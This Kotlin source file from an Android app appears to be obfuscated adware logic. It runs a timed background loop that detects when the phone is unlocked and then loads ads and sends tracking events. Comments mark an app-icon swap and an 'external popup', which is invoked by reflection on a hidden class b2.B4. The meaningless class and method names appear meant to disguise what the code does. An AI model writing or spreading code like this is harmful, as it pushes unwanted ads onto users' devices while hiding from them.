package com.sister.smart.blonde

import android.app.KeyguardManager
import android.content.Context
import android.os.PowerManager
import com.sister.smart.blonde.c.HelperList
import com.sister.smart.kind.HelperApp
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * Date：2025/4/21
 * Describe:
 */
class KindGooSister(private val context: Context) : BaseBossInfo() {
    private val mBlondeNetPost by lazy { BlondeNetPost() }
    private var mainScope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private var kindEvent = ""
    private val mBadAdHelper get() = HelperApp.mCallAction.mBadAdHelper

    fun kindEvent() {
        if (kindEvent.isNotBlank()) return
        kindEvent = "basketball"
        mainScope.launch {
            delay(1000)
            mBadAdHelper.load()
            // 换icon
            HelperApp.mCallAction.b()
            delay(2000)
            while (kindEvent == "basketball") {
                sisterEvent()
                delay(Headband.time1)
            }
            kindEvent = "90"
        }
    }

    private fun sisterEvent() {
        mBlondeNetPost.postEvent("timertask")
        if (isSisterSmart().not()) return
        val helperList = HelperList(mBlondeNetPost)
        val s = helperList.check()
        if (s.isNotBlank() && s != "1") {
            mBadAdHelper.load()
            return
        }
        val isr = mBadAdHelper.isReady()
        when (isr) {
            "1" -> mBlondeNetPost.postEvent("isready")
            "2" -> mBlondeNetPost.postEvent("isready1")
        }
        if (mBadAdHelper.isShowingAd().not() || isr != "false") {
            mainScope.launch {
                finishAc()
                // 外弹
                mBlondeNetPost.postEvent("callstart")
                Class.forName("b2.B4").getMethod("a0", String::class.java).invoke(null, "begin")
            }
        }
    }

    private fun isSisterSmart(): Boolean {
        return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
            Context.KEYGUARD_SERVICE
        ) as KeyguardManager).isDeviceLocked.not()
    }

}